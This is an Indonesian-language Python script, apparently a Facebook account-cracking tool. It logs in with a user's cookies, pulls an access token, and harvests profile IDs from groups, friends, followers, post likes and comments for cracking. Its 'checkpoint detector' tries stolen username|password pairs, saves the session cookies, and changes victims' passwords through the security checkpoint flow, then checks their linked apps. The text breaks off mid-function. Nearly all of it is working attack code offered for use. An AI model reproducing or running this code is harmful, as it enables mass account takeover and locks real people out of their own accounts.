# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Yayan XD.

import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->

############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok,cp,id,loop = [],[],[],0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
###########################################################################################

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02)
def logo():
    print("""%s
   
 \x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __ 
 \x1b[1;92m| _ \ _ \ __|  \/  |_ _| | | |  \/  |  
 \x1b[1;92m|  _/   / _|| |\/| || || |_| | |\/| |   
 \x1b[1;92m|_| |_|_\___|_|  |_|___|\___/|_|  |_| 
 """%(N))  

#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print('\n\n %s[%s#%s] Hackk selesai...\n'%(N,K,N))
        print(' [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N))
        print(' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N))
        cek_cp = input(f"\n [{O}?{N}] munculkan opsi checkpoint detedtor [Y/t]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] jangan kosong");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" [{M}!{N}] hidupkan mode pesawat 3 detik terlebih dahulu.");time.sleep(5)
            ww=input(f"\n [{O}?{N}] ubah password ketika tap yes [Y/t]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" [{H}•{N}] contoh password : {H}yayanxd{N}")
                pwBar=input(f"\n [{H}+{N}] masukan password baru : ")
                print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('|')
                jalan(f' {N}[{M}>{N}] mencoba login ke akun : {K}{kontol.replace(" [×] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                print("")
            print("")
            print('   [ %sProses Pengecekan Selesai %s]\n'%(H,N))
            input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
        elif cek_cp in["T","t"]:
            exit(f"\n  {O}*{N} Selamat tinggal:)")
        else:
            print(f"\n [{M}!{N}] Y/t goblok");hasil(ok,cp)
    else:
        print('\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N));exit()

#MASUK TOKEN
def yayanxd():
    os.system('clear')
    print (' %s*%s tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
    cookie = input("\n %s[%s?%s] Cookies : %s"% (N,K,N,O))
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,H));time.sleep(3);os.system('xdg-open https://youtu.be/DF7bUCn0GFY');yayanxd()
    try:
        head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': cookie}
        asww=requests.get("https://business.facebook.com/creatorstudio/home", headers=head)
        reqq=re.search('{"accessToken":"(EAA\w+)', asww.text)
        tokn=reqq.group(1)
        open('.cokie.txt', 'a').write(cookie)
        open('.token.txt', 'a').write(tokn)
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokn)).json()['name']
        print('\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N));time.sleep(2)
        print(' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N));time.sleep(2)
        input(' %s*%s tekan enter '%(O,N))
        os.system('xdg-open https://youtube.com/channel/iCNnDa8pyAVCNJbSqtaXA-mg')
        moch_yayan()
    except AttributeError:
        print('\n %s[%s×%s] cookies invalid'%(N,M,N));time.sleep(1);yayanxd()
    except UnboundLocalError:
        print('\n %s[%s×%s] cookies invalid'%(N,M,N));time.sleep(1);yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))

### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    logo()
    try:
        kontol = open('.token.txt', 'r').read()
    except IOError:
        print('\n %s[%s×%s] cookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print('\n %s[%s×%s] cookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
    #IP = requests.get('https://yayanxd.my.id/server/ip').text
    _mmk_ = open('.cokie.txt').read()
    kueh  = {"cookie":_mmk_}
#    try:
    #    memek = open('license.txt', 'r').read()
#    except IOError:
    #    print("\n %s[%s×%s] Lisense invalid"%(N,M,N));os.system('rm -rf license.txt');time.sleep(2);cok()
 #   try:
 #       mmk = requests.get("https://hakiki-apikey.000webhostapp.com/chek.php?project=ngetes&apikey="+memek).json()
 #       email = mmk['email']
#        bergabung = mmk['joined']
#        day,month,year = bergabung.split(" ")
#        month = bulan_key[month]
#    except KeyError:
       # print("\n %s[%s×%s] Lisense invalid"%(N,M,N));os.system('rm -rf license.txt');time.sleep(2);cok()
  #  print("\n [*] Email      : %s"%(email));time.sleep(0.03)
 #   print(" [*] Bergabung  : %s %s %s "%(day,month,year));time.sleep(0.03)
#    print(" [*] ---------------------------------------------");time.sleep(0.03)
 #   try:
     #   kadaluarsa = mmk['expired']
#        day,month,year = kadaluarsa.split(" ")
  #      month = bulan_key[month]
 #       tod = mmk['member'].replace("Premium", "\x1b[1;92mYa\x1b[0m").replace("Trial", "\x1b[1;91mTidak\x1b[0m")
#    except (KeyError,IOError):
#        print("\n %s[%s×%s] Lisense invalid"%(N,M,N));os.system('rm -rf license.txt');time.sleep(2);cok()
    #print(" [*] Premium    : %s"%(tod))
 #   print(" [*] Kadaluarsa : %s %s %s"%(day,month,year));time.sleep(0.03)
 #   print(" [*] -----------/----------------------------------");time.sleep(0.03)/
    print(" [ HALLO SAYANG %s%s%s ]\n"%(K,nama,N));time.sleep(0.03)
    print(' [%s01%s]. Hack id dari anggota grup fb'%(O,N));time.sleep(0.03)
    print(' [%s02%s]. Hack id dari teman publik'%(O,N));time.sleep(0.03)
    print(' [%s03%s]. Hack id dari total followers'%(O,N));time.sleep(0.03)
    print(' [%s04%s]. Hack id dari like postingan'%(O,N));time.sleep(0.03)
    print(' [%s05%s]. Hack id dari random id massal'%(O,N));time.sleep(0.03)
    print(' [%s06%s]. Hack id dari komentar postingan'%(O,N));time.sleep(0.03)
    print(' [%s07%s]. Hack akun instagram [%sbaru%s]'%(O,N,H,N));time.sleep(0.03)
    print(' [%s08%s]. Checkpoint detedtor'%(O,N));time.sleep(0.03)
    print(' [%s09%s]. Settings user agent'%(O,N));time.sleep(0.03)
    print(' [%s10%s].cek hasil hack'%(O,N));time.sleep(0.03)
    print(' [%s00%s]. logout (%shapus cookie%s)'%(M,N,M,N));time.sleep(0.03)
    pepek = input('\n [%s*%s] menu : '%(H,N))
    if pepek == '':
        print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
        kontol = input(f"{N} [?] masukkan id grup : ")
        if kontol in[""," "]:
            print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
        else:
            try:
                ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}",cookies=kueh).text
                if "Halaman Tidak Ditemukan" in ajg:
                    print(f"\n %s[%s×%s] group dengan id {kontol} tidak ditemukan"%(N,M,N));time.sleep(2);moch_yayan()
                elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
                    print("\n %s[%s×%s] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun"%(N,M,N));time.sleep(2);moch_yayan()
                elif "Konten Tidak Ditemukan" in ajg:
                    print(f"\n %s[%s×%s] group dengan id {kontol} tidak ditemukan"%(N,M,N));time.sleep(2);moch_yayan()
                else:
                    print(" [*] nama grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
                    print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
                    crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("\n [!] Kesalahan Pada Koneksi")
    elif pepek in['2','02']:
        try:
            print("\n [*] Ketik 'me' jika ingin crack dari daftar teman")
            user = input(' [*] masukan id atau username : ')
            _memek_ = __convert__(user)
            for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),kontol)).json()["data"]:
                id.append(a['id'] + '<=>' + a['name'])
        except KeyError:
            print('\n %s[%s×%s] gagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);moch_yayan()
    elif pepek in['3','03']:
        kontol = input(f"{N} [?] masukan id atau username followers : ")
        if kontol in[""," "]:
            print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
        try:
            print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
            followers(f"https://mbasic.facebook.com/subscribe/lists/?id={kontol}")
        except KeyError:
            print(f"\n [!] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['4','04']:
        kontol = input(f"{N} [?] masukan id postingan : ")
        if kontol in[""," "]:
            print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
        try:
            print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
            like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}")
        except KeyError:
            print(f"\n [!] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['5','05']:
        _ngocok_(kontol)
    elif pepek in['6','06']:
        kontol = input(f"{N} [?] masukan id postingan : ")
        if kontol in[""," "]:
            print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
        try:
            print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
            ngomen_post(f"https://mbasic.facebook.com/{kontol}")
        except KeyError:
            print(f"\n [!] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['7','07']:
        log_igeh()
        menu_igeh()
    elif pepek in['8','08']:
        gabut()
    elif pepek in['9','09']:
        seting_yntkts()
    elif pepek in['10']:
        dirs = os.listdir("results")
        print('\n [ hasil crack yang tersimpan di file anda ]\n')
        for file in dirs:
            print(" [%s+%s] %s"%(O,N,file))
        file = input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
        if file == "":
            file = input("\n %s[%s?%s] masukan nama file :%s %s"%(N,M,N,H,N))
        total = open("results/%s"%(file)).read().splitlines()
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
        input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
    elif pepek in['0','00']:
        print("")
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s[%s+%s] menghapus cookie %s'%(N,M,N,x)); sys.stdout.flush()
            time.sleep(1)
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
        exit('\n %s[%s✓%s]%s berhasil menghapus cookie'%(N,M,N,H))
    else:
        print('\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);moch_yayan()
    if len(id)!=0:
        print("")
        return __crack__().plerr(id)
    else:
        print("\n %s[%s×%s] gagal mengambil id, silahkan coba lagi"%(N,M,N));time.sleep(2);moch_yayan()

### GANTI USER AGENT
def seting_yntkts():
    print('\n (%s1%s) ganti user agent'%(O,N))
    print(' (%s2%s) check user agent'%(O,N))
    ytbjts = input('\n %s[%s?%s] choose : '%(N,O,N))
    if ytbjts == '':
        print('\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N));time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print('\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n %s[%s×%s] input yang bener'%(N,M,N));time.sleep(2);seting_yntkts()

# USER AGENT BARU
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    _asu_ = input('\n [%s?%s] ingin menggunakan user agent hp anda [Y/t]: '%(O,N))
    if _asu_ == '':
        print('\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
        _agen_ = input(' [%s?%s] masukan user agent hp anda :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil menggunakan user agent hp anda...'%(N,H,N))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    elif _asu_ in['T','t']:
        _agen_ = input(' [%s?%s] masukan user agent :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n %s[%s!%s] Y/t ngentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()

# CRACK DARI GRUP
def crack_grup(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=kueh).text
        memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
        for softek in memek:
            if "profile.php?" in softek[0]:
                id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
            else:
                id.append(softek[0]+"<=>"+softek[1])
            sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        if "Lihat Selengkapnya" in kontol:
            crack_grup(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:
            def geh(gey):
                a=requests.get(gey,cookies=kueh).text
                b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh(url_mb+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
            geh(f"{url_mb}/groups/"+re.search("id=(\\d*)",hencet).group(1))
    except:pass
# CRACK LIKE POSTINGAN
def like_post(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=kueh).text
        if "Semua 0" in kontol:
            print("\n [!] Tidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v");time.sleep(2);moch_yayan()
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
    except:pass
# CRACK FOLLOWERS
def followers(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=kueh).text
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('a',href=True):
            if "profile.php" in mmk.get('href'):
                bb = mmk.text
                xd = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",mmk.get("href")))
                id.append(bb+'<=>'+xd+'\n')
            sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all('a',href=True):
            if 'Lihat Selengkapnya' in asu.text:
                followers("https://mbasic.facebook.com/subscribe/lists/?id="+asu.get("href"))
    except:pass
# CRACK KOMENTAR POSTINGAN
def ngomen_post(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol= requests.get(hencet,cookies=kueh,headers=header_grup).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                else:
                    xz = _id_.get("href").split('?')[0]
                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                sys.stdout.write('\r [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnya…" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"))
    except:pass
# CRACK ID RANDOM
def _ngocok_(__ppk__):
    try:
        nanya_keun = int(input('\n [%s?%s] masukan jumblah target : '%(M,N)))
    except:nanya_keun=1
    print(" [%s*%s] Ketik 'me' jika ingin crack dari daftar teman\n"%(O,N))
    for mnh in range(nanya_keun):
        mnh +=1
        user = input(' [%s*%s] masukan id atau username %s%s%s : '%(O,N,H,mnh,N))
        _memek_ = __convert__(user)
        try:
            for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),__ppk__)).json()["data"]:
                uid = a["id"]
                nama = a["name"]
                id.append(uid+"<=>"+nama)
        except (KeyError,IOError):
            print('\n [×] gagal mengambil id, kemungkinan id tidaklah publik');time.sleep(3);moch_yayan()
# USERNAME CONVERT TO ID
def __convert__(user):
    if user == "me":
        return {"_kontol_":user}
    else:
        payload = {"fburl": "https://free.facebook.com/{}".format(user), "check": "Lookup"}
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        mmk = requests.post(url_lookup, data=payload).content
        xxx = BeautifulSoup(mmk, "html.parser")
        idt = xxx.find("span", id="code")
        asw = idt.text
        return {"_kontol_":asw}
# CHEKER AKUN CHECKPOINT
def gabut():
    dirs = os.listdir("results")
    print('\n [ hasil crack yang tersimpan di file anda ]\n')
    for file in dirs:
        print(" [%s+%s] %s"%(O,N,file))
    jalan(f" [{M}×{N}] sebelum memasukan file,hidupkan mode pesawat 3 detik.");time.sleep(5)
    files = input("\n [%s?%s] masukan nama file : %s"%(M,N,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print('\n [!] file tidak ada');time.sleep(2);moch_yayan()
    ww=input(f"\n {N}[{O}?{N}] ubah password ketika tap yes [Y/t]: ")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f" [{H}•{N}] contoh password : {H}yayanxd{N}")
        pwBar=input(f"\n [{H}+{N}] masukan password baru : ")
        if len(pwBar) <= 5:
             print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print('%s [%s*%s] Total %s%s%s Akun'%(N,O,N,K,str(len(buka_baju)),N))
    jalan(" %s[%s#%s] --------------------------------------------"%(N,O,N))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        jalan(f' {N}[{M}>{N}] mencoba login ke akun : {K}{kontol.replace(" [×] ", "")}{N}')
        try:
            log_hasil(titid[0].replace(" [×] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('   [ %sProses Pengecekan Selesai %s]\n'%(H,N))
    input(' [ %sKEMBALI%s ] '%(O,N));os.system(f"rm -rf {buka_baju}");moch_yayan()

# CHEKPOINT DETEDTOR
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {N}[{M}×{N}] akun sesi new")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f" [✓] {user}|{pasw}|{coki}\n")
            print(f"\r  🎉{H} hore akunya tidak checkpoint{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengecek aplikasi...{N}");time.sleep(0.03)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    print(f"\r  🎉{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "YayanGanteng:v"
                    print(f"\r  🎉{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%s!%s] opshh akunya terpasang autentikasi dua faktor :('%(M,N))
            else:
                open('results/ERROR.txt', 'a').write(f" [×] {user}|{pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f" [×] {user}|{pasw}\n")
            print(" %s[%s*%s] Terdapat %s Opsi "%(N,O,N,len(cek)))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r {N}[{M}!{N}] Kata sandi salah atau sudah diubah")
        open('results/INVALID-OK.txt', 'a').write(f" [×] {user}|{pasw}\n")

#UBAH PW
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {N}[{H}✓{N}] berhasil mengubah password menjadi:\n {N}[{H}✓{N}]{H} {user}|{''.join(mmk)}|{coki}{N}")
        open('results/TAB-YES.txt', 'a').write(f" [✓] {user}|{''.join(mmk)}|{coki}\n")
        cek_apk(session,coki)
# CEK APLIKASI YANG TERKAIT
def cek_apk(session,cookie):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
